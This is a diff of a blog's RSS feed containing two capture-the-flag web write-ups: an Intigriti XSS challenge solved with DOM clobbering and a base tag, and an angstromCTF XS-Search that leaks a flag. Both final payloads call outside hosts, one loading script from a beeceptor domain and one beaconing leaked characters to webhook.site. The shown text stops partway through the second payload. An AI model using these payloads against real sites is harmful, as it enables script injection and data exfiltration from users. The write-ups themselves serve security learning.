@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
   <channel>
-    <title>writeups on Alfin&#39;s Notes</title>
+    <title>Writeups on Alfin&#39;s Notes</title>
     <link>http://example.org/tags/writeups/</link>
-    <description>Recent content in writeups on Alfin&#39;s Notes</description>
+    <description>Recent content in Writeups on Alfin&#39;s Notes</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>Some copyright notice - [my license](https://example.com/license)</copyright>
@@ -11,10 +11,10 @@
     
     <item>
       <title>Intigriti 0724 XSS Challenge</title>
-      <link>http://example.org/posts/my-first-post/</link>
+      <link>http://example.org/posts/intigriti-0724/</link>
       <pubDate>Thu, 06 Jun 2024 21:00:26 +0530</pubDate>
       
-      <guid>http://example.org/posts/my-first-post/</guid>
+      <guid>http://example.org/posts/intigriti-0724/</guid>
       <description><![CDATA[<p><strong>tl;dr</strong></p>
 <ul>
 <li>Dom clobbering to clobber isDevelopmet</li>
@@ -23,75 +23,75 @@
 </ul>
 <h2 id="-initial-analysis">🔎 Initial analysis</h2>
 <p>We are given a memo sharing application , and its seems like we html injection using the memo parameter. Looking at the client-side code for the application.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">integrity</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=&#34;</span>&gt;
-      <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;memoForm&#34;</span>).addEventListener(<span style="color:#f1fa8c">&#34;submit&#34;</span>, (event) =&gt; {
-        event.preventDefault();
-        <span style="color:#ff79c6">const</span> memoContent <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;memoContentInput&#34;</span>).value;
-        <span style="color:#8be9fd;font-style:italic">window</span>.location.href <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">window</span>.location.href.split(<span style="color:#f1fa8c">&#34;?&#34;</span>)[<span style="color:#bd93f9">0</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">?memo=</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">encodeURIComponent</span>(
-          memoContent
-        )<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>;
-      });
-
-      <span style="color:#ff79c6">const</span> urlParams <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> URLSearchParams(<span style="color:#8be9fd;font-style:italic">window</span>.location.search);
-      <span style="color:#ff79c6">const</span> sharedMemo <span style="color:#ff79c6">=</span> urlParams.get(<span style="color:#f1fa8c">&#34;memo&#34;</span>);
-
-      <span style="color:#ff79c6">if</span> (sharedMemo) {
-        <span style="color:#ff79c6">const</span> displayElement <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;displayMemo&#34;</span>);
-        <span style="color:#6272a4">//Don&#39;t worry about XSS, the CSP will protect us for now
-</span><span style="color:#6272a4"></span>        displayElement.innerHTML <span style="color:#ff79c6">=</span> sharedMemo;
-
-        <span style="color:#ff79c6">if</span> (origin <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#34;http://localhost&#34;</span>) isDevelopment <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>;
-        <span style="color:#ff79c6">if</span> (isDevelopment) {
-          <span style="color:#6272a4">//Testing XSS sanitization for next release
-</span><span style="color:#6272a4"></span>          <span style="color:#ff79c6">try</span> {
-            <span style="color:#ff79c6">const</span> sanitizedMemo <span style="color:#ff79c6">=</span> DOMPurify.sanitize(sharedMemo);
-            displayElement.innerHTML <span style="color:#ff79c6">=</span> sanitizedMemo;
-          } <span style="color:#ff79c6">catch</span> (error) {
-            <span style="color:#ff79c6">const</span> loggerScript <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.createElement(<span style="color:#f1fa8c">&#34;script&#34;</span>);
-            loggerScript.src <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./logger.js&#34;</span>;
-            loggerScript.onload <span style="color:#ff79c6">=</span> () =&gt; logError(error);
-            <span style="color:#8be9fd;font-style:italic">document</span>.head.appendChild(loggerScript);
-          }
-        }
-      }
-    &lt;/<span style="color:#ff79c6">script</span>&gt;
-</code></pre></div><p>as you can see our input HTML goes into an innerHTML sink in the beginning itself, however there is no easy XSS as there is a CSP.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
-<span style="color:#ff79c6">default</span><span style="color:#ff79c6">-</span>src <span style="color:#ff79c6">*</span>; script<span style="color:#ff79c6">-</span>src <span style="color:#f1fa8c">&#39;strict-dynamic&#39;</span> <span style="color:#f1fa8c">&#39;sha256-bSjVkAbbcTI28KD1mUfs4dpQxuQ+V4WWUvdQWCI4iXw=&#39;</span> <span style="color:#f1fa8c">&#39;sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=&#39;</span>;
-</code></pre></div><p>The csp doesnt seem too strict , the first thing that i thought of was that default src is * and there is no base uri directive in the csp .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">integrity</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;memoForm&#34;</span>).addEventListener(<span style="color:#f1fa8c">&#34;submit&#34;</span>, (event) =&gt; {
+</span></span><span style="display:flex;"><span>        event.preventDefault();
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">const</span> memoContent <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;memoContentInput&#34;</span>).value;
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">window</span>.location.href <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">window</span>.location.href.split(<span style="color:#f1fa8c">&#34;?&#34;</span>)[<span style="color:#bd93f9">0</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">?memo=</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">encodeURIComponent</span>(
+</span></span><span style="display:flex;"><span>          memoContent
+</span></span><span style="display:flex;"><span>        )<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>;
+</span></span><span style="display:flex;"><span>      });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">const</span> urlParams <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> URLSearchParams(<span style="color:#8be9fd;font-style:italic">window</span>.location.search);
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">const</span> sharedMemo <span style="color:#ff79c6">=</span> urlParams.get(<span style="color:#f1fa8c">&#34;memo&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> (sharedMemo) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">const</span> displayElement <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;displayMemo&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//Don&#39;t worry about XSS, the CSP will protect us for now
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        displayElement.innerHTML <span style="color:#ff79c6">=</span> sharedMemo;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (origin <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#34;http://localhost&#34;</span>) isDevelopment <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (isDevelopment) {
+</span></span><span style="display:flex;"><span>          <span style="color:#6272a4">//Testing XSS sanitization for next release
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>          <span style="color:#ff79c6">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> sanitizedMemo <span style="color:#ff79c6">=</span> DOMPurify.sanitize(sharedMemo);
+</span></span><span style="display:flex;"><span>            displayElement.innerHTML <span style="color:#ff79c6">=</span> sanitizedMemo;
+</span></span><span style="display:flex;"><span>          } <span style="color:#ff79c6">catch</span> (error) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> loggerScript <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.createElement(<span style="color:#f1fa8c">&#34;script&#34;</span>);
+</span></span><span style="display:flex;"><span>            loggerScript.src <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./logger.js&#34;</span>;
+</span></span><span style="display:flex;"><span>            loggerScript.onload <span style="color:#ff79c6">=</span> () =&gt; logError(error);
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">document</span>.head.appendChild(loggerScript);
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#ff79c6">script</span>&gt;
+</span></span></code></pre></div><p>as you can see our input HTML goes into an innerHTML sink in the beginning itself, however there is no easy XSS as there is a CSP.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">default</span><span style="color:#ff79c6">-</span>src <span style="color:#ff79c6">*</span>; script<span style="color:#ff79c6">-</span>src <span style="color:#f1fa8c">&#39;strict-dynamic&#39;</span> <span style="color:#f1fa8c">&#39;sha256-bSjVkAbbcTI28KD1mUfs4dpQxuQ+V4WWUvdQWCI4iXw=&#39;</span> <span style="color:#f1fa8c">&#39;sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=&#39;</span>;
+</span></span></code></pre></div><p>The csp doesnt seem too strict , the first thing that i thought of was that default src is * and there is no base uri directive in the csp .</p>
 <p>So we can inject a base tag with our server as the href value which will make all the scripts with relative paths in the page load resources from our server.</p>
 <p>However there is only one script being used in the page which is  dompurify.js and it is being loaded way before our injection happens so we cant make it load from our server using base tags.</p>
 <p>However there is another script (logger.js) that is being loaded dynamically if certain conditions are satisfied. We can control the location from where logger.js is loaded using base tags as it is being loaded after our injection happens .</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#ff79c6">if</span> (origin <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#34;http://localhost&#34;</span>) isDevelopment <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>;
-        <span style="color:#ff79c6">if</span> (isDevelopment) {
-          <span style="color:#6272a4">//Testing XSS sanitization for next release
-</span><span style="color:#6272a4"></span>          <span style="color:#ff79c6">try</span> {
-            <span style="color:#ff79c6">const</span> sanitizedMemo <span style="color:#ff79c6">=</span> DOMPurify.sanitize(sharedMemo);
-            displayElement.innerHTML <span style="color:#ff79c6">=</span> sanitizedMemo;
-          } <span style="color:#ff79c6">catch</span> (error) {
-            <span style="color:#ff79c6">const</span> loggerScript <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.createElement(<span style="color:#f1fa8c">&#34;script&#34;</span>);
-            loggerScript.src <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./logger.js&#34;</span>;
-            loggerScript.onload <span style="color:#ff79c6">=</span> () =&gt; logError(error);
-            <span style="color:#8be9fd;font-style:italic">document</span>.head.appendChild(loggerScript);
-          }
-        }
-</code></pre></div><p>So to make logger.js load from our external server we have somehow reach the catch block. So for that to happen we need isDevelopment to be true, so that we can get inside the if block.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (origin <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#34;http://localhost&#34;</span>) isDevelopment <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (isDevelopment) {
+</span></span><span style="display:flex;"><span>          <span style="color:#6272a4">//Testing XSS sanitization for next release
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>          <span style="color:#ff79c6">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> sanitizedMemo <span style="color:#ff79c6">=</span> DOMPurify.sanitize(sharedMemo);
+</span></span><span style="display:flex;"><span>            displayElement.innerHTML <span style="color:#ff79c6">=</span> sanitizedMemo;
+</span></span><span style="display:flex;"><span>          } <span style="color:#ff79c6">catch</span> (error) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> loggerScript <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.createElement(<span style="color:#f1fa8c">&#34;script&#34;</span>);
+</span></span><span style="display:flex;"><span>            loggerScript.src <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./logger.js&#34;</span>;
+</span></span><span style="display:flex;"><span>            loggerScript.onload <span style="color:#ff79c6">=</span> () =&gt; logError(error);
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">document</span>.head.appendChild(loggerScript);
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>So to make logger.js load from our external server we have somehow reach the catch block. So for that to happen we need isDevelopment to be true, so that we can get inside the if block.</p>
 <p>isDeveloment is only set to true if the origin is localhost.At the first glance it seems impossible to set isDevelopment as true.</p>
 <p>However there are certain stuff you could to with just HTML injection!!</p>
 <h2 id="-attack-plan">🥷 Attack plan</h2>
 <p>So the attack plan is to use DOM clobbering here as we have HTML injection to define the isDevelopment variable. As isDevelopment is a global variable a simple tag with id attribute as isDevelopment will define that variable. Eg</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#ff79c6">&lt;</span>a id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;isDevelopment&#34;</span><span style="color:#ff79c6">&gt;</span>,<span style="color:#ff79c6">&lt;</span>div id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;isdevelopment&#34;</span><span style="color:#ff79c6">&gt;</span> etc 
-</code></pre></div><h2 id="causing-an-error-to-reach-the-catch-block-">Causing an Error to reach the catch block 🌟</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>a id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;isDevelopment&#34;</span><span style="color:#ff79c6">&gt;</span>,<span style="color:#ff79c6">&lt;</span>div id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;isdevelopment&#34;</span><span style="color:#ff79c6">&gt;</span> etc 
+</span></span></code></pre></div><h2 id="causing-an-error-to-reach-the-catch-block-">Causing an Error to reach the catch block 🌟</h2>
 <p>So now we are inside the if block , and to get to our logger.js script to load we have to get to the catch block . For that we have to cause an error somehow in these lines of code</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#ff79c6">try</span> {
-    <span style="color:#ff79c6">const</span> sanitizedMemo <span style="color:#ff79c6">=</span> DOMPurify.sanitize(sharedMemo);
-    displayElement.innerHTML <span style="color:#ff79c6">=</span> sanitizedMemo;
-}
-</code></pre></div><p>If you look at the source code closely you can see that Dompurify is being loaded as a relative path. so if we access the page like /index.html/blah dompurify will try to get loaded from /blah .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> sanitizedMemo <span style="color:#ff79c6">=</span> DOMPurify.sanitize(sharedMemo);
+</span></span><span style="display:flex;"><span>    displayElement.innerHTML <span style="color:#ff79c6">=</span> sanitizedMemo;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If you look at the source code closely you can see that Dompurify is being loaded as a relative path. so if we access the page like /index.html/blah dompurify will try to get loaded from /blah .</p>
 <p>So now that we are in the catch block we can use a base tag to load logger.js from our server.</p>
 <h2 id="--final-payloads">🚀  Final Payloads</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#ff79c6">a</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;isDevelopment&#34;</span>&gt;asdf&lt;/<span style="color:#ff79c6">a</span>&gt;&lt;<span style="color:#ff79c6">base</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://alfino.free.beeceptor.com/&#34;</span>&gt;
-</code></pre></div><p>where we host logger.js at <a href="https://alfino.free.beeceptor.com/logger.js">https://alfino.free.beeceptor.com/logger.js</a></p>]]></description>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">a</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;isDevelopment&#34;</span>&gt;asdf&lt;/<span style="color:#ff79c6">a</span>&gt;&lt;<span style="color:#ff79c6">base</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://alfino.free.beeceptor.com/&#34;</span>&gt;
+</span></span></code></pre></div><p>where we host logger.js at <a href="https://alfino.free.beeceptor.com/logger.js">https://alfino.free.beeceptor.com/logger.js</a></p>]]></description>
       
     </item>
     
@@ -112,67 +112,67 @@
 <h2 id="-initial-analysis">🔎 Initial analysis</h2>
 <p>We are given the application source code and a challenge link. Also, there is a <code>waaas.js</code> for the admin bot. Looking at the application, the main functionality was the search endpoint.</p>
 <p>Taking a look at the code for /search endpoint in the <code>index.js</code> file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">app.get(<span style="color:#f1fa8c">&#39;/search&#39;</span>, (req, res) =&gt; {
-	<span style="color:#ff79c6">if</span> (req.cookies[<span style="color:#f1fa8c">&#39;admin_cookie&#39;</span>] <span style="color:#ff79c6">!==</span> secretvalue) {
-		res.status(<span style="color:#bd93f9">403</span>).send(<span style="color:#f1fa8c">&#34;Unauthorized&#34;</span>);
-		<span style="color:#ff79c6">return</span>;
-	}
-	<span style="color:#ff79c6">try</span> {
-		<span style="color:#8be9fd;font-style:italic">let</span> query <span style="color:#ff79c6">=</span> req.query.q;
-		<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">let</span> flag <span style="color:#ff79c6">of</span> flags) {
-			<span style="color:#ff79c6">if</span> (flag.indexOf(query) <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
-				res.status(<span style="color:#bd93f9">200</span>).send(<span style="color:#f1fa8c">&#34;Found&#34;</span>);
-				<span style="color:#ff79c6">return</span>;
-			}
-		}
-		res.status(<span style="color:#bd93f9">404</span>).send(<span style="color:#f1fa8c">&#34;Not Found&#34;</span>);
-	} <span style="color:#ff79c6">catch</span> (e) {
-		console.log(e);
-		res.sendStatus(<span style="color:#bd93f9">500</span>);
-	}
-})
-</code></pre></div><p>It was basically checking if our input query was a substring of the flag. But we cannot send requests to /search due to the check in the start, which checks whether or not the request is from the admin user. So our requests would get 403 Unauthorized as the response.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>app.get(<span style="color:#f1fa8c">&#39;/search&#39;</span>, (req, res) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (req.cookies[<span style="color:#f1fa8c">&#39;admin_cookie&#39;</span>] <span style="color:#ff79c6">!==</span> secretvalue) {
+</span></span><span style="display:flex;"><span>		res.status(<span style="color:#bd93f9">403</span>).send(<span style="color:#f1fa8c">&#34;Unauthorized&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">try</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">let</span> query <span style="color:#ff79c6">=</span> req.query.q;
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">let</span> flag <span style="color:#ff79c6">of</span> flags) {
+</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> (flag.indexOf(query) <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
+</span></span><span style="display:flex;"><span>				res.status(<span style="color:#bd93f9">200</span>).send(<span style="color:#f1fa8c">&#34;Found&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#ff79c6">return</span>;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		res.status(<span style="color:#bd93f9">404</span>).send(<span style="color:#f1fa8c">&#34;Not Found&#34;</span>);
+</span></span><span style="display:flex;"><span>	} <span style="color:#ff79c6">catch</span> (e) {
+</span></span><span style="display:flex;"><span>		console.log(e);
+</span></span><span style="display:flex;"><span>		res.sendStatus(<span style="color:#bd93f9">500</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>It was basically checking if our input query was a substring of the flag. But we cannot send requests to /search due to the check in the start, which checks whether or not the request is from the admin user. So our requests would get 403 Unauthorized as the response.</p>
 <h2 id="-attack-plan">🥷 Attack plan</h2>
 <p>Since we cant directly access the /search enpoint we have to somehow make the admin send those requests. One approach is to get XSS anywhere in the site so we can send fetch requests bruteforce the flag. But unfortunately there is no XSS in this site.</p>
 <p>The Next approach would be an <strong>XS-Search</strong> attack to leak the flag . As the bot is visiting any url we give it. In the /search enpoint if the query is a valid substring of the flag it was returning <strong>200 Found</strong> and if its not a valid substring it was returning <strong>404 Not Found</strong>.</p>
 <p>We can use <a href="https://https://xsleaks.dev/docs/attacks/error-events/">Error Events</a> to differntiate between these 2 status codes cross site .</p>
 <p>But there is another issue . . . . . <strong>Same Site Cookies!!</strong> . Looking the admin bots source code we can see that the admin cookie is <strong>same-site Lax</strong> .</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#ff79c6">const</span> cookie <span style="color:#ff79c6">=</span> {
-                domain<span style="color:#ff79c6">:</span> domain,
-                name<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;admin_cookie&#34;</span>,
-                value<span style="color:#ff79c6">:</span> key,
-                httpOnly<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
-                secure<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
-                sameSite<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;Lax&#39;</span>
-    };
-</code></pre></div><p>So the cookies won&rsquo;t be sent on the  requests which are sent from our hosted exploit as it wont be same-site 😓.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> cookie <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>                domain<span style="color:#ff79c6">:</span> domain,
+</span></span><span style="display:flex;"><span>                name<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;admin_cookie&#34;</span>,
+</span></span><span style="display:flex;"><span>                value<span style="color:#ff79c6">:</span> key,
+</span></span><span style="display:flex;"><span>                httpOnly<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
+</span></span><span style="display:flex;"><span>                secure<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
+</span></span><span style="display:flex;"><span>                sameSite<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;Lax&#39;</span>
+</span></span><span style="display:flex;"><span>    };
+</span></span></code></pre></div><p>So the cookies won&rsquo;t be sent on the  requests which are sent from our hosted exploit as it wont be same-site 😓.</p>
 <h2 id="samesite-leaks-ftw--">SameSite Leaks ftw  🌟</h2>
 <p>If we have XSS or HTML injection in any domain which is same-site to the challenge domain we can use that in our favour for <a href="https://https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks">Same Site Leaks</a>.</p>
 <p>The challenge was hosted on <code>https://wwwwwwwwaas.web.actf.co/</code> and all other challenges was were subdomains of <code>web.actf.co</code> and fortunately we had XSS on <code>markdown.web.actf.co</code> which is <strong>same-site</strong>.</p>
 <p>So now we can host our exploit to leak the flag on <code>markdown.web.actf.co</code> .</p>
 <h2 id="-final-payloads">🚀 Final Payloads</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#ff79c6">const</span> charset <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;abcdef1234567890{}ghijklmnopqrstuvwxyz_&#34;</span>
-<span style="color:#8be9fd;font-style:italic">let</span> found <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;actf&#34;</span>
-<span style="color:#ff79c6">const</span> leak_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;https://webhook.site/4d3c543c-1211-4c4c-9fea-c7fc3336e2a5&#34;</span>   
-
-<span style="color:#ff79c6">const</span> next <span style="color:#ff79c6">=</span> (i) =&gt; {
-      <span style="color:#ff79c6">char</span> <span style="color:#ff79c6">=</span> charset[i]
-      link <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.createElement(<span style="color:#f1fa8c">&#34;link&#34;</span>)
-      link.rel <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;stylesheet&#34;</span>
-      <span style="color:#8be9fd;font-style:italic">document</span>.head.appendChild(link)            
-      link.onload <span style="color:#ff79c6">=</span> () =&gt; {
-           found <span style="color:#ff79c6">+=</span> charset[i]
-           navigator.sendBeacon(leak_url,JSON.stringify({type<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;success&#34;</span>, found<span style="color:#ff79c6">:</span>found,<span style="color:#ff79c6">char</span><span style="color:#ff79c6">:</span>charset[i] }))
-           next(<span style="color:#bd93f9">0</span>)
-       }
-
-       link.onerror <span style="color:#ff79c6">=</span> () =&gt; {
-           next(i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>)
-       }
-       link.href <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;https://wwwwwwwwaas.web.actf.co/search?q=&#34;</span><span style="color:#ff79c6">+</span>found<span style="color:#ff79c6">+</span>charset[i]
-}
-next(<span style="color:#bd93f9">0</span>)
-</code></pre></div><h2 id="-flag">🚩 Flag</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> charset <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;abcdef1234567890{}ghijklmnopqrstuvwxyz_&#34;</span>
